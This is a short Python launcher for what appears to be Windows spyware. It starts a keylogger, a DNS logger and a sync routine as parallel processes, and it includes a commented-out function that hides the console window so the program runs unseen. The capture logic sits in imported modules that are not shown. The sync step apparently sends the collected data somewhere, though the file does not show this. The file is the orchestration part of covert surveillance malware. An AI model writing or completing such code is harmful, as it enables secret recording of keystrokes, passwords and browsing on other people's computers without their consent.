import os

import win32event
import win32api
import winerror
from dns_logger import dns_logger
from key_logger import key_logger
from change_dir import dir_path
from sync import sync
import multiprocessing
# #this hide function help to minimize the console
# def hide():
#     import win32console,win32gui
#     window = win32console.GetConsoleWindow()
#     win32gui.ShowWindow(window,0)
#     return True

# hide()




dir_path()

if __name__ == '__main__':
  # create two processes for each function
  p1 = multiprocessing.Process (target=dns_logger)
  p2 = multiprocessing.Process (target=key_logger)
  p3 = multiprocessing.Process (target=sync)
  
  # start the processes
  p1.start()
  p2.start()
  p3.start()
  
  # wait for the processes to finish
  p1.join()
  p2.join()
  p3.join()
